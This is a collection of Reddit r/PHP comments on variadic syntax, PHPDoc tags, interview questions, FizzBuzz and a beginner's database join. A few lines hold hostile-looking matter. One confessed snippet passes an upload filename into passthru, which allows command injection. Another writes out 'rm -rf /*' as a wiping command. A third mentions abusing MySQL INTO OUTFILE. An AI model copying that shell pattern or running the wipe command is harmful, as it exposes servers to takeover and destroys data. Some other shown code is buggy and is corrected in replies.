Every other programming language uses "."? What about all of the ones that don't? I do not subscribe to the idea that syntax has to match Ruby and Python exactly. We're allowed to be different.
relevant username :)
dont judge me.... I once used php only for the web interface, basically using bash as my scripting environment. Eg. passthru("cp " . $_FILES['file']['tmp_file'] . " uploads/" . "$_FILES['file']['tmp_file']);
I'm sure the FIG will have a bash at something PSR-0ish for functions when the feature is in place.
Why is a framework a black box? The source code isn't obfuscated. If the framework is out of date and unsupported, the bugs are already going to be your responsibility. There's nothing wrong with fixing them yourself. It's only a black box if you keep that mentality. Otherwise it's just PHP code. 
&lt;/thread&gt;
Update, a few of the worst offenders are gone/on their way out already. * **set_magic_quotes_runtime()** - Removed in PHP 5.4.0. * **mysql()** - removed in 5.0.0. * **mysql_escape_string()** - Deprecated in PHP 5.5.0. As for if you like eval/strstr/class_alias or not is basically irrelevant. I like having enough rope. If I hang myself with it thats my fault.
No, just this guy's server. That's all that was silenced after this code was deployed.
That was literally a word for word question I had on an interview
This reminds me of why PHP added namespaces. It's something that is already happening but in a hacky way, so it's time to make it a first class citizen. Thanks for the post and moderation of this thread /u/philsturgeon
&gt; I understand that, but ultimately there remains a finite pool of time and resources allotted to each set of features, requests, bugs that they all must share from. That's not really how PHP development works, as it is done on a voluntary basis. People implement things they are personally interested in. The reason that nobody implemented named parameters yet isn't that people were busy implementing other stuff, rather nobody had enough interest in it (yet).
The example that you post shows the syntactical support for the Annotations notations used by Doctrine, Symfony and others. Annotations is way out of scope for the PHPDoc PSR but syntactical support will allow annotations to be 'legal' under the definition in this specification. See http://docs.doctrine-project.org/projects/doctrine-common/en/latest/reference/annotations.html for more information on annotations in PHP.
&gt; Weird? really? PHP core is full of weird things that PHP-haters laugh about and using the same syntax like every other language is weird? Sorry, but every other language does not use the `*foo` syntax. E.g. both Java and JavaScript (as per ECMAScript Harmony) use the syntax proposed for PHP. Arguably both those languages are a lot more relevant to PHP (because it has the Java OO model and most PHP programmers also write JS) than Ruby and Python. I don't know, but your response *feels* a bit like you just came over from /r/lolphp to troll a bit here. You are complaining about the usual PHP gripes (parameter order bla bla bla), which have nothing to do with the topic at hand. I would respectfully ask to keep discussions here on topic and keep meta-debates about php elsewhere. Thanks :) If you have constructive criticism though, please feel free to voice it. If you can explain why using `*` over `...` is superior, I'd be interested to hear that.
They just had me read aloud some code and that came up. The code was arbitrary; testing to see if I knew what it was. 
There are several reasons for deprecating @var in favor of @type: 1. Constants do not have a tag and there is a desire for such, I have considered re-using @var of introducing @const but that seems a waste. @const is a duplicate of @var and the @var name is a direct reference to properties in the PHP4 days. 2. as drrkcknlsn indicates; using a more generic term opens up possibilities to use the tag in more situations; such as Inline PHPDoc Statements and custom element definitions (as with associative arrays) 3. Related to 1, the name is no longer semantically accurate or recognizable as 'var' used to be the way a property was defined in PHP4 but no more since PHP5. Neither of these reasons on itself would be enough but these combined were the main motivators for this.
&gt;how you would take its specification and build a better platform for developers to build websites with It already exists, and it's called Drupal.
Example of what it's useful for: Unsetting a bit flag: $flags &amp;= ~SOME_FLAG;
An interesting use case. I can see that one.
Interesting (and quite valid) reasons. I guess when it comes down to it, I'm still a strong typing guy at heart and when I see "@type" I feel like there should be some enforcement applied or a way to infer whether something is validated for type rather than essentially a recommendation.
*nod* With the final suggestion that the RFC be updated with alternate syntax suggestions with reasons for each similar to the namespace token discussion, otherwise it's not an RFC, it's just a "This is how it's going to be implemented" spec.
Are there not key people on the team that take time to test patches, quality check, manage the repository and the releases, and devote their time to issues for which they may or may not have a personal interest? Don't you think some sort of prioritization is needed for them? 
Yes, there are a few key figures doing releases (RMs) and managing infrastructure, but that's also just voluntary work. There are no people working full-time on PHP that I'm aware of (apart from one person who's hired by another company to work on PHP). Note: By "personal interest" I don't mean "I'm only gonna fix the bugs I encounter myself", just that people choose what they want to do (like, "I feel like fixing crashes right now" :) There is no prioritization per se.
I hear you, it was an after thought. But I should have looked at that before posting.
Timber looks pretty cool, I like the way the templating emulates a more OO-model in the way it presents the data to use.. 
Well if it really won't detract from other issues then sure, I say go for it. I've always thought we need a declarative way to specify variadic functions. 
updated ;)
There's really nothing at all stopping you from doing *anything*. Heck, you could install your own custom kernel with a "special" filesystem that treats any write system calls as a call to wipe a file. The possibilities are endless.
Ever hear of **Cyclomatic** **Complexity**? * **Readbility** is harmed because now I have to do more work to find out what the arguments do, it basically doesn't save me any work but it DOES create it. And what happens if the code is encoded and i cant look at it, only the signature? Zend, Ioncube, et al I'm looking at you! * **Security** See readability above. * **type Hinting** A php variable is meant to be loosely typed, this goes against PHP' entire design so either fix the design first or stop trying to monkey patch it. * **Documentation** The idea of **could** and **would** are very different things, because as you ahve already pointed out the syntax is just sugar and the meat of the code and how the values are used is going to be code specific. This, it creates a need for more documentation, but doesn't improve the existing docs at all.. unless you could making them incomplete or actively wrong as a good thing? This is not just a bad idea, this is a terrible idea and the more i think about it it just points out the flaws in PHP's language design, so I am either thinking this is a typical PHP terrible idea, or possibly a brilliant troll of the PHP community made to help point out these language design flaws. 
Explained here. http://www.reddit.com/r/PHP/comments/1l9zx3/php_rfcvariadics_php_wiki/cbxzw2d
oh dear. What a sadistic website. 
The namespaced function proposal was designed with function autoloading in mind. EDIT: Cheers to you for using pharen. I toyed quite a bit with lisphp myself ;-).
Yes, but the Zend stuff has been around much longer than Laravel.
Haha... Dang.
this guy knows
I'll type out a full explanation of why this answer has no merit whatsoever when I'm not at the pub.
Go home philsturgeon, you'r drunk.
&gt; Go home philsturgeon, you'r drunk. Spelling bro!
Readability - Oh, it's all about you is it? You can't read so it's not worthwhile for everyone else. Security - what does security have to do with readability? Type Hinting - Not all variables are created equal. Type hinting in PHP [exists](http://php.net/manual/en/language.oop5.typehinting.php) - so use it when appropriate. Documentation - See Readability. Obviously you don't like to read documentation - that's why your type hinting statement is so far off base. 
He's is just trolling you Phil. He doesn't believe what he's typing. Carry on with your beer :).
I'd blame little Bobby Tables
I created it to give people a heads up with what to expect. I've seen numerous posts about "What should I expect in my interview". I suppose you can call it a resource instead of a cheat sheet.
Bikeshedding is determining the color of the bikeshed before you build the house. If the house is built and we're trying to paint the shed then discussing the color of the paint isn't bikeshedding, it's the core discussion. It would be impossible to _objectively_ determine anything in the syntax, it all comes down to preference. If the RFC were simply an abstract on variadics and nikic hadn't already fleshed out where they would be used, more or less how they'd be implemented, and their usage for most cases, then just saying "I know we haven't talked about syntax yet but..." That would be bikeshedding.
Is that the exact code? Because you don't seem to execute the query anywhere?
Reading a lot of these questions made me think I was taking a mid term in a college PHP course. I would feel like a lot of my time was being wasted if I was asked these questions verbally during a long interview. Granted, some of them would easily weed out the subpar applicants, it would seem better to do a short interview to establish their skills (if needed -- GitHub, websites, blogs and such tell a large story themselves). After that, a more in-depth interview touching only on subjects you are unsure about (because there are no examples to base an opinion off), and perhaps a contract period, even for half a day, would be better than one three hour ~~tour~~ interview.
&gt; Readbility is harmed because now I have to do more work to find out what the arguments do Right but you actually know that there are arguments! Spotting the function signature and knowing right off the bat that it takes an unlimited number of functions (and exactly what type they are going to be) is immediately 1000% times easier than trying to spot a random `func_get_args()` call which could be on the 20th/100th line of a method. &gt; And what happens if the code is encoded and i cant look at it, only the signature? Then you know 100% that the function is going to take an unlimited number of arguments, and if the dev has been kind enough to type-hint then you know exactly what is going in. Self documenting code for the win. Compare that to the same method using `func_get_args()` encoded with Zend/Ioncube and you have literally NO idea that it takes multiple arguments. Your first bullet point has been demolished. &gt; Security See readability above. This has has no impact whatsoever on security. Weird. &gt; type Hinting A php variable is meant to be loosely typed, this goes against PHP' entire design so either fix the design first or stop trying to monkey patch it. This has nothing to do with monkey patching. I'm not sure you know what that means. But yes, PHP variables CAN be loosely typed, unless you use type hinting, which is what im talking about... Type hinting exists in PHP already and has done for a long time. SO, instead of saying "I'd like an array of random shit, which I will then check to see is something useful in this method" with a whole bunch of boilerplate, you can easily say "I'd like an 'array' full of Twitter\Status instances. Nice. &gt; Documentation The idea of could and would are very different things, I'm the Coordinator for the FIG PSR on the new PHPDoc standard, which is being Edited by the phpDocumentor team. So yeah, if this RFC goes in it WILL get support in the new standard. I said could because this RFC has not been voted in yet. &gt; This, it creates a need for more documentation, but doesn't improve the existing docs at all Well, how do you document the usage of `func_get_args()` in phpDoc or anything else? You write a whole bunch of text about it, which is useless compared to the usual "A) self documenting code B) DocBlock" syntax that EVERY other PHP argument allows, and this syntax will allow. &gt; unless you could making them incomplete or actively wrong as a good thing? Literally no idea what you mean buddy. &gt; This is not just a bad idea, this is a terrible idea and the more i think about it it just points out the flaws in PHP's language design, so I am either thinking this is a typical PHP terrible idea, or possibly a brilliant troll of the PHP community made to help point out these language design flaws. Go back to /r/lolphp buddy. You've not said anything useful and you're just embarrassing yourself here.
Unfortunately this is the issue when you're taking over for what's obviously a very unorganized and frankly not a very good programmer. This is why we have conventions, and we all need to stick to them. I won't comment on much of the project, but I would highly advise against translating to Twig, and then again to Silex. It's unnecessary. (unless you're looking for overtime). If your end framework is gonna be Silex, you should just begin developing for Silex. Period.
You should revise your closure definition. I'll quote Wikipedia &gt; The term closure is often mistakenly used to mean anonymous function. This is probably because many programmers learn about both concepts at the same time, in the form of small helper functions that are anonymous closures. An anonymous function is a function literal without a name, while a closure is an instance of a function, a value, whose non-local variables have been bound either to values or to storage locations (depending on the language; see the lexical environment section below). A closure doesn't even have to be an anonymous function, in the Wikipedia entry it gives a very concise Python example of what a closure is: http://en.wikipedia.org/wiki/Closure_(computer_science)#Example *edit: Python is not the greatest example for closures if you don't know it. The nonlocal keyword is used because it will try to make/use a local variable instead of using the one defined outside the function. *edit2: Javascript + jQuery is a great example of closures. You are constantly passing functions into jQuery that access non-local scope. For example: var click_message = 'you clicked me!'; $('#mybutton').on('click', function() { alert(click_message); }); I believe that's a closure, because the anonymous function accesses a non-local variable.
Tadaaa https://wiki.php.net/rfc/function_autoloading
...and at the end all you've really shown for the most part is that the person can memorize syntax. There's a total of one problem question, and it's a pretty shallow problem. I would not use this.
You're amazing :D
`echo "&lt;table boarder='0'&gt;` `&lt;tr&gt;` &lt;th&gt;Line Number&lt;/th&gt; &lt;th&gt;Total Usage in MB&lt;/th&gt; &lt;th&gt;User&lt;/th&gt; &lt;th&gt;Data Plan&lt;/th&gt; &lt;/tr&gt;"; while ($row = mysqli_fetch_array($results)) { echo "&lt;tr&gt;"; echo "&lt;td&gt;" . $row['current_usage.Line_Number'] . "&lt;/td&gt;"; echo "&lt;td&gt;" . $row['Total_Usage'] . "&lt;/td&gt;"; echo "&lt;td&gt;" . $row['Line_No'] . "&lt;/td&gt;"; echo "&lt;/tr&gt;"; } echo "&lt;/table&gt;"; This is the code i use to show the data or trying to.
This is a great time to talk about **XY Problems**. An XY Problem is when someone asks a question (X) but actually they really needed to ask "How do I Y?". For example "I've been trying to cut bread with a two handed broadsword, but it just munges up the bread. What is the correct technique for getting a clean slice with my sword?" This gives answerers two options: answer the question, or solve the problem? The proper solution here is to use a bread knife. But then people get cranky at you because you didn't actually answer the question as asked, and people tell you that swords are easier for people who are new to cutting things, etc. *ugh* So here is my answer. It's pretty hard to tell what is going wrong here because I can't see what the database is doing. $results = "SELECT current_usage.Line_Number, current_usage.Total_Usage, current_sam.Line_No, current_sam.Line_Description, current_sam.Data_Plan FROM current_usage INNER JOIN current_sam ON current_sam.Line_No = current_usage.Line_Number"; This is pretty hard to read, largely because you have used full table names. You can alias that stuff to make it more readable. $results = "SELECT usage.Line_Number, usage.Total_Usage, sam.Line_No, sam.Line_Description, sam.Data_Plan FROM current_usage AS u INNER JOIN current_sam AS sam ON sam.Line_No = usage.Line_Number"; OK, things that are wrong with this jump to mind now. First of all, capitals can cause problems. Data_Plan introduces ambiguity. Dataplan, data_plan, Data_plan, data_plan... all completely different. By convention you shouldn't use capitals, to remove ambiguity. Some people might say to use DataPlan. But those people are heretics, who will be put up against the wall any day now. Want to also mention your query variable has a bad name. It's not a result. It's a query. Secondly, you've used "Line_Number" and "Line_No", introducing an exciting source of ambiguity. What I suspect you actually want here is an ID. You can call it *id*. I'm assuming, here that you're using these columns as auto-incrementing primary keys. I should also point out that you can (and should) just call all of the A.I.P.K fields "id". You can also imply relationships by how you name the foreign key fields. $query = "SELECT usage.id, usage.total_usage, sam.id AS sam_id, sam.line_description, sam.data_plan FROM current_usage AS u INNER JOIN current_sam AS sam ON sam.usage_id = usage.id"; It's possible, of course, that I've misunderstood your keys. You may not be using a primary key, but something called a *natural key*. For example, it may in this case be a phone number, a real and meaningful actual number. If this is the case... don't do this. It will cause you problems, believe me. So now where are we? You have a database join happening, but there's no way to no whether you're successfully getting data. You should be able to manually run that query on the DB, possibly using something like phpMyAdmin. That should tell you whether you're getting data, no matching result, or an error. Can't help with the last two, so the first one... data is coming, but the loop isn't working. while ($row = mysqli_fetch_array($results)) { echo "&lt;tr&gt;"; echo "&lt;td&gt;" . $row['current_usage.Line_Number'] . "&lt;/td&gt;"; echo "&lt;td&gt;" . $row['Total_Usage'] . "&lt;/td&gt;"; echo "&lt;td&gt;" . $row['Line_No'] . "&lt;/td&gt;"; echo "&lt;/tr&gt;"; } This is.. very very bad. It's hard to tell whether you've done this all on one line in code, or whether reddit just munted it, but I suspect the former. In any case, that's a problem right there. Space out your stuff. But more importantly, don't do it at all like this. mysqli_ methods are a bad idea. You're much better off using PDO and getting the result as an array. Then you can loop over that using foreach. This helps with *separation of concerns*, meaning bits of your code only do one thing at a time. &lt;?php $sth = $dbh-&gt;prepare($query); $sth-&gt;execute(); $result = $sth-&gt;fetchAll(PDO::FETCH_ASSOC); ?&gt; &lt;table&gt; &lt;?php foreach($result as $row){ ?&gt; &lt;tr&gt; &lt;td&gt;&lt;?=$row['Line_Number']?&gt;&lt;/td&gt; &lt;td&gt;&lt;?=$row['Total_Usage']?&gt;&lt;/td&gt; &lt;td&gt;&lt;?=$row['Line_No']?&gt;&lt;/td&gt; &lt;/tr&gt; &lt;?php } ?&gt; &lt;/table&gt; Note that this is still way too bound up together. Combining your query code and your layout on the same page makes me itchy. But it's a step in the right direction. TL;DR You need to run $db_result = mysqli_query($results); then change your loop to while($db_result = mysqli_fetch_array($results)){
I don't know if you've left it out, but you seem to be missing a: $results = mysqli_query($results); before your loop.
Thanks for your help, seems like i thought i knew what i was doing but i guess not, will research more before posting another XY Problem question...
Does that really surprise you? :P
It was more of a general requirement. ofc you wouldn't do one piece of software, but if your business is about bleeding edge shit (ex: development for up and coming trends) then it tends to do more harm than good to use something [stuck in 1994](http://www.thefreedictionary.com/hyperbole).
5 functional loc? What more clear and concise implementation would you expect in php?
That was *never* the original point. You've made that up for your own purposes. The point is simply to determine that someone can translate a short problem description into functional code; i.e that they can program to the most basic degree. For some hiring processes this is great at filtering out incompetent applicants in a short amount of time.
I'm not sure if this matters or not, but working several different programming gigs over the last decade I've heard of IA documents, requirement docs, and spec docs being interpreted as many different things, and often with overlapping meanings. I'm not sure if there is an "academically correct" interpretation. 
Who said I'm not drunk?
I know fully well what the switches do, I was making a point as to why I use rm -fr instead of the norm of rm -rf ; it is because I read it in my head as "remove forcefully" i.e. do not warn me about "directories" or whatnot.
As someone who has hired many PHP devs to work on various teams I've led, these look like question I'd be asking to screen for a junior developer / advanced beginner position in the first phone call before we even decide to interview them. Just to get a feel for their knowledge depth and if they've done any *real* programming. The answers you'll get from these questions really only tell you what little syntax facts the developer knows, and for junior level, that's really all you can ask for. Most junior devs don't have enough experience to tell you the "when/why" for using these language features. They can usually only wire a few things together like form data into a database and send a few emails. Hopefully your interview also consists of more general questions than small facts. That's when you know you've got a group that knows how to treat its developers, rather than simply checking off the box that you know A from Z. Here are some more impactful questions that really tell them how you as a person WORK rather than what you simply KNOW. After all, it's easy to look up facts or learn new language syntax. It's much more telling of your success within the new team if you tell them **how** you work. Other questions that should be on this list: **1. Describe how version control fits into your development workflow.** (Tells them your version control experience and your ideas on it.) **2. What are the benefits of prepared SQL statements?** (Do you know it speeds up queries for identical queries with only different parameters? Are you database-minded? Do you know prepared statements help protect against SQL injection?) **3. Describe how you've sanitized data before using it in your program.** **4. What security issues are you aware of in PHP?** (Tells if/how you think about security and what your experience is in not ending up with an owned server.) You should also expect to be asked some soft-skill questions as these are INCREDIBLY more valuable for evaluating junior developers. Because you probably still have a lot to learn it's important they find out how you acquire new info, how you apply it and where you turn for help. Are you someone who ends up relying on others a lot or can you be self-sufficient in finding the answer. **1. Walk me through how you troubleshoot a bug or error message in your program.** (Do you search google first? Do you try searching the codebase and digging into the actual underlying code? Do you ask the team lead right away?) **2. How do you decide what to focus your learning efforts on?** (Do you have good sources for new developments? Are you passionate about one area more than another, and how does that interest fill in gaps in their team?) **3. Tell me about the last new technology you picked up and how you went about learning it?** (Tells them what is most fresh in your mind and also how you find new info. Do you just search Google, read tech publications, follow trendsetters on Twitter, watch conference talk recordings?) **4. What was the last problem that stumped you? What avenues did you pursue before deciding you were stumped? How long was it before you sought help?** (Tells them your threshold for attacking a hard problem and how much hand-holding you might need, or if you're the type where they should step in early to prevent you spinning your wheels.) Good luck interviewers and applicants!
&gt; but your response feels a bit like you just came over from /r/lolphp On the contrary, I actually enjoy using PHP and use it every single day at work. My objection is not rooted in trolling. I'm simply suggesting that inventing a new syntax that's not being used anywhere else (anywhere else in PHP, that is) simply because `*$args` is *weird* (what's weird about it?) is wrong. &gt; If you have constructive criticism though, please feel free to voice it. If you can explain why using * over ... is superior, I'd be interested to hear that. Most programmers would understand what `*$args` means simply by looking at it. How many people could do the same for `&amp;...$args`? I think the much saner approach is teaching the engine that `*` is not just a multiplication operator and only after that, implementing variadics with `*$args` as the syntax.
&gt; If I hang myself with it thats my fault. True, but that's just the thing. Despite all its newbie friendliness, PHP makes it very easy to shoot yourself in the foot.
I alway thought that for($i=1;$i&lt;101;$i++){echo($i%3?'':'Fizz').($i%5?'':'Buzz').'&lt;br&gt;';} Was pretty damn clear ;)
You seem to be living in a different world than reality. Let me explain it to you. Code is written far less than it is read. Readability is key. I'm not just saying that this is bad, I'm saying func_get_args() is bad, and that legitimizing it with this is irrational and would legitimize yet another anti-pattern in php. My first bullet point stands. As far as security goes, read readability again. As far as type hinting goes, if you had a ruby background you would know exactly what monkey patching is, but basically in PHP its anytime you do a check for the existence of a function and then declare or re-declare is method body, either to provide compatibility or do something "your way" as unfortunately seems to be the most common place. Re-read this again with that new knowledge in your head. Documentation: Docs are a great thing when they are correct, succinct, and explain the issues.. but clean code is far more valuable! Taking into consideration that func_get_args() is evil, reread this and I think you will understand my basic premise as I think that's where your fundamental misunderstanding is from. 
&amp;= |= += .= Are all valid PHP and serve a purpose.
(bonus: these questions also point out the differences of focus between a degree in software engineering and a computer science degree.)
And also incorrect; it doesn't print out the non-divisible numbers normally. Shows what happens when you try to stick everything on one line.
As someone who interviews developers (specifically for PHP) regularly: A good interviewer will ask you questions that allows you room to demonstrate that you have both the knowledge of these fundamental items, as well as the wherewithal to show when and when not to use them. Memorizing the manual will get you a job; understanding concepts and being creative with your implementations will earn you a career.
Yes, but ZF1 and ZF2 are completely different animals. 
This is true, but don't discount it altogether. W3schools has inaccuracies (which are few, similar in percentage to Wikipedia), but there are no websites as comprehensive with such easy to follow examples for learning HTML. One of the best universities for computer science in the world, Stanford, has a web development class whose website references w3schools.
I've been writing PHP for 10 years, and I've never used this.
I'm a bit disappointed that this was approved only because it seemed like far too little. If a proper module construct was added to PHP then you could import an entire set of functions once and make use of existing autoloading facilities. Instead this adds a lot of extra configuration at the top of every file to be realistically effective. 
True. That was a very quick example I made. You could do this instead: for($i = 1; $i &lt;= 100; $i ++) { if($i % 3 == 0) echo 'Fizz'; if($i % 5 == 0) echo 'Buzz'; if($i % 3 != 0 &amp;&amp; $i % 5 != 0) echo $i; echo '&lt;br&gt;'; } Also here is a one-liner, though I'm not sure how to do the ternary without writing "FizzBuzz" by itself. Kind of tired so didn't think about it much. for($i = 1; $i &lt;= 100; $i ++) { echo ($i % 3 == 0 ? ($i % 5 == 0 ? 'FizzBuzz' : 'Fizz') : ($i % 5 == 0 ? 'Buzz' : $i)) . '&lt;br&gt;'; } 
$a =&amp; $b is the same as $a = &amp;b. [Fiddle](http://phpfiddle.org/main/code/zpw-sb3).
I'd argue that conciseness for the sake of conciseness is not always properly maintainable, so sometimes it's OK to have the FizzBuzz on its own.
I agree with what seems to be the general flow of opinion here. Phase out the old codebase and introduce a new, well designed API built on a modern framework, my ideal combination would be Symfony + Propel + Twig + SASS. An application of this scale doesn't neccessitate the complexity of a data mapper architecture, so I'd opt for Propel as opposed to Doctrine, since it's arguably simpler and definitely faster. I might be asking too much with the SASS/LESS support, but that would also be nice to have. Twig is just personal preference, I admit that I only have a passing familiarity with Smarty. For a complete package, Laravel would also be a good choice, since it comes bundled with a well performing ORM &amp; templating system. However WP's market share is heavily rooted in its wealth of plugins, so the new WP would either have to provide a wrapper or say goodbye to its popularity for a (long) time.
No problem, it's one thing understanding it in your mind and another explaining it to another person
I'm actually looking for jobs now, so you helped :).
You've in effect created a god object. You should try to separate your stuff into single responsibilities instead. If you need a concrete example of how to do this, you're going to have to explain the case so we can understand the problems you are trying to solve. Edit: reading material for you: http://en.wikipedia.org/wiki/SOLID_%28object-oriented_design%29
Wrap as much as you can with tests before you change anything
`extract()` ***destroys*** local scope and using it instead of `import_request_variables()` is just `register_globals` with a different name. No PHP 5+ project should ever, ever, ever use `register_globals` like behaviour, period. ` clearstatcache()` only exists because functions like `stat(), lstat(), file_exists(), is_writable(), is_readable(), is_executable(), is_file(), is_dir(), is_link(), filectime(), fileatime(), filemtime(), fileinode(), filegroup(), fileowner(), filesize(), filetype()` and `fileperms()` do not have a `$nocache = true` parameter. The *sensible* solution would be to have a `File` class like this: $file = new File("/path/to/file.txt", $nocache = true); $file-&gt;stat(); $file-&gt;lstat(); $file-&gt;exists(); $file-&gt;writable(); 
I think you're all missing the point. It's just don't trust. Anything.
The whole library is to create a better API for Magmi (Magento product importer engine), so its actually just product data in all the "setters" A product is created with this $this-&gt;product = new Simple('sku'); $this-&gt;product-&gt;setDescription('Description') -&gt;setName('name') -&gt;setPrice(100) -&gt;setQty(100) -&gt;setShortDescription('short description') -&gt;setTax(1) -&gt;setWeight(100); I was first thinking of making the same structure as now, but then inject the data into the product, something like this $requireddata = new RequiredData(); $requireddata-&gt;setName('foo') -&gt;setDescription('foo') .... $categories = new Category(); $categories-&gt;addCategory('foo') -&gt;addCategory('bar'); $product = new Simple('sku'); $product-&gt;injectData($requireddata); $product-&gt;injectData($categories); But that just seems that overcomplicate things, but its also much better to extend and create your own data classes. So would that be a better solution?
Well, I don't have any experience with Magento. Regarding the product created, does it always have those properties, or would it only apply to certain goods?
Some values are required, and it will fail if they isn't there (the ones in RequiredData) But you can also create own attributes in Magento, and then use the class to import into that attribute.
I know. I try to use php5.3/5.4/5.5 features when coding myself but there is always somebody who will give me some monstrous old project without VCS and ask me to run it on a php5.4/5.5 webserver and extract() works great if I add it to some index/loader/config script :)
Ah, so they're EAVs? In that case, maybe building on ArrayObject would be preferable, and do the property validation in the data mapper while trying to persist the object. 
Well not actually, what im sending to the data importer is just a simple array $array['sku'] = 'sku'; $array['description'] = 'description'; And thats it, inserting into the database, eav, reindex etc is handled by "Magmi"
&gt; I'm simply suggesting that inventing a new syntax that's not being used anywhere else (anywhere else in PHP, that is) simply because *$args is weird (what's weird about it?) is wrong. `*` is also not used anywhere in PHP with this meaning. `*` in PHP right now means "multiply" and is a binary operator. If that's all you know then seeing `foo(*$bar)` in a signature will not help you. So I don't really get what you mean by the "already used in PHP" argument. What I mean by "weird" is that to me `*$args` just doesn't look nice (as in pleasant to read), but that may just be personal perception. &gt; Most programmers would understand what *$args means simply by looking at it. How many people could do the same for &amp;...$args? Please compare the same thing. Either compare `*$args` with `...$args` or `&amp;*$args` with `&amp;...$args`. Again, you can disagree here, but for me personally `...` is a much clearer indicator of a variadic function than `*`. I guess this depends a lot on the language background you have, e.g. if you work a lot with Ruby or Python then `*` in a signature will be "variadic" for you. I on the other hand do a lot of work with C or C++, where `*` in such a context would be a pointer and `...` a variadic function. Regarding the reference notation, imho `&amp;*$args` is starting to look really weird, whereas `&amp;... $args` is still somewhat legible. But anyway, as you can see, this is just a bunch of personal preferences: I don't think that there is any strong objective argument for either side. (At which point we are really starting to bikeshed: Discuss whether we should paint the bikeshed in blue or in red or whether they we like `*` or `...` more]).
&gt; If the house is built and we're trying to paint the shed then discussing the color of the paint isn't bikeshedding, it's the core discussion. That's not the essence of it. The important part is that a lot of time is spent discussing a rather minor detail. It's not particularly important whether the bikeshed is red or blue, but you can certainly discuss this for three hours ;) Similarly here the discussion would come down to people saying how much they prefer `*` or that they like `...` or lot more. This is the point where objective discussion is usually lost. Whether or not this is bikeshedding to you depends on how important to you consider this choice.
&gt; extract() destroys local scope If you don't want to overwrite any local variables, use EXTR_SKIP. extract() is a function commonly used when implementing templating in PHP. If you want to voice criticism, the right one would be "Does this have to be a function? I can do this in a simple foreach loop myself". And not anything about changing local scope, because that's its purpose and you'll have to do this whether there is a function for it or not (for implementing templating that is). &gt; clearstatcache() only exists because functions like ... do not have a $nocache = true parameter. No, it exists because clearstatcache() is a lot more useful than a $nocache parameter. It covers the use cases of $nocache=true by a simple clearstatcache() call before whatever call you wanted to do, but it has the additional - and much more useful - functionality of invalidating the cache globally, for all filesystem functions.
I agree, modules would be nice. But also a lot harder to do, unfortunately.
On the other hand code with more branches than it needs to have is not maintainable either because it has repeated logic and requires more tests to tell whether it actually works. What if we want to change buzz to bazz? Now you need to change it in two places; thus the maintability of it is actually worse if it's less concise in that manner. 
Downvote me for it if you want for it. But I wouldn't hire you if you couldn't identify what was wrong with that stylistically or got defensive about the style. I've never had a candidate in my office who could not fizz buzz. I don't automatically rule them out for doing it with bad style, but I ask them questions about the style to gauge how well they would do in a code review. I'm of the opinion that if you're going to write example code in an interview it needs to be stylistically very tight code. 
I would build out the architecture in the MVC design pattern to allow for easy routing and ajax capabilities. Also add LESS/SASS support for template builders. If you really want to be ahead of the curve then build the whole wordpress backend into a RESTful resource and build the front using Angular/Node.js that consumes this resource. This will allow for multi platform standardized content on any device. 
For fun, you should ask an 'editor' or 'end user' how much they enjoy using Drupal. Sure, Drupal is powerful, but it really isn't very friendly towards users with its clunky interface. 
For language consistency wouldn't it be good to have `use class` as well, that has the semantics of `use` and deprecate that for some point in the future to be removed?
Looks good to me. It does what it says and says what it does, and clearly. Once thing I would do is move the break tags out to the end of the loop. I left my reasons for doing that as a comment on the original article (little things can say a lot about people's approach to solving programming problems).
That would completely break BC (backward compatibility). If breaking BC were an option, there would possibly be a much better solution, such as introducing a module construct and/or merging class/function/constant namespaces, allowing all of them to be imported consistently with a `use` or `import` statement. But it's not, so we need to live with compromises such as this one.
I would say, at a worst your server gets rooted :D If the database was set up with really wrong permissions, so that an attacker could use the 'INTO OUTFILE' mysql command to write arbitrary files, and if mysql runs as root, you're screwed.
I kind of see his point. The tests are for an interviewer to understand something about how the interviewee approaches problem-solving. The fact that there are a hundred working solutions that will work just as well, are *just as right*, but which highlight different skills and thinking approaches, is what makes FizzBuzz such a good test. Pick the one you like, understand it, understand the alternatives and why you have chosen one version over another, and I think you are heading the right direction.
Nested ternary conditions get very nasty, very quickly. Keep away from my code ;-)
make wordpress2 rewrite it completely use composer
Next occurrence is what I was looking for. Thanks. 
Also available [part 1](http://www.bitfalls.com/2013/08/autofight-php-job-interview-task-part-1.html) and [on reddit](http://www.reddit.com/r/PHP/comments/1kq398/autofight_a_php_job_interview_task_tutorial_part_1/), [part 2](http://www.bitfalls.com/2013/08/autofight-php-job-interview-task-part-2.html) and [on reddit](http://www.reddit.com/r/PHP/comments/1l2z63/autofight_a_php_job_interview_task_tutorial_part_2/).
So... Going all in on namespaces, using constants... But then you are using HTML inside your classes? Could you consider redoing this part? 
Ahh yes, traits... But the code should still be 5.3ish, so traits is not an option, for now - but maybe in the future :) But I begun to rewrite the whole stuff to the "inject" method, actually not the worst thing, because you can inject classes which isn't in my library, as long as you implements the interface. So now its much more expandable :)
Well cry about it why don't you.
I like this idea :)
I disagree. You may know the answers instinctively, but not really had to articulate them. It pays to go through the exercise of describing these things *before* you go into an interview.
Maybe just add a note to your article, stating that it is not the best way to do it?
Traits is available on PHP &gt;= 5.4
It depends on the architecture you're going for, really. If you're making an application that sits on top of an API, then you'd have to allow signups via the API. If not, you'd probably want to take the path that some others do an have the user register on a site and be given the keys to access the API. It really just depends on what you're going for architecturally. IMHO, I'd make the user management a part of the API - then you don't have to maintain two things. Your app can either just call the API for user actions or reuse the same logic via a shared module or something.
The source given doesn't discuss *Natural Join* at all. A different source would be preferred. That goes for this reference, whose quality is not diminished in any significant way by this preference, as well as Stanford. Teaching people to use a better source is just better. In fact, I wouldn't *fault* someone for referencing w3schools so much as I am impressed when someone can explain to me what you've just said here. ^^The ^^people ^^I ^^interview ^^are ^^never ^^close ^^to ^^any ^^of ^^this. ^^^^&lt;crying&gt;
Hmm Statamic CMS looks interesting. I am researching various CMS solutions atm so this was serendipitous :)
Sure, I'll make sure I stress it out more. Thanks for the feedback
At phpTek this year there was a talk from one of the main WordPress engineers. His main point was that although they'd love to scrap the code and start over, they can't as they have to strive for 100% compatibility. You can toss WordPress on any machine and it'll work. The amount of configurations it runs on is astounding. It pretty much has fallback code in place just in case a server doesn't have a certain module loaded. Although it is a dated model, it's very impressive and effective.
Yes, I think we need to move away from Wordpress en masse, so hopefully we can find some good options.
Exactly. Toss a blogger into Drupal and they are lost. Give them WordPress and even my mother could get it up and running on GoDaddy.
rmr -rf /* however, will work without --no-preserve-root
I know you don't. That's why someone else has written a guide to help people.
Here we go: https://wiki.php.net/rfc/argument_unpacking
I also avoid the long one-liners. Not readable. And nested ternaries sure are nasty!
You're on a roll.
well he did state in his last RFC that this one was coming so...
